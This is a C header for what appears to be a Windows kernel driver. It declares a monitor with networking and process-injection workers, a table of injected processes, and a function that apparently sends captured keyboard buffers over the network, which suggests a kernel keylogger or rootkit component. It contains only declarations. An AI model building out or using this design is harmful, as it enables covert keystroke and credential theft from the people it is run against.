#pragma once

#include <inc/drvmain.h>

#include <inc/sysworker.h>
#include <inc/mwsk.h>
#include <inc/keybrd.h>
#include <inc/inject.h>
#include <inc/thash.h>

#define MONITOR_STATE_STOPPED 1
#define MONITOR_STATE_STARTED 2

typedef struct _MONITOR {
	SYSWORKER		NetWorker;
	PMWSK_CONTEXT   WskContext;
	SYSWORKER		InjectWorker;
	volatile LONG	State;
	KGUARDED_MUTEX	Mutex;
	THASH			InjectedProcTable;
} MONITOR, *PMONITOR;

VOID
	MonitorInit();

NTSTATUS
    MonitorStart();

NTSTATUS
    MonitorStop();

VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry);


PMONITOR
	MonitorGetInstance(VOID);
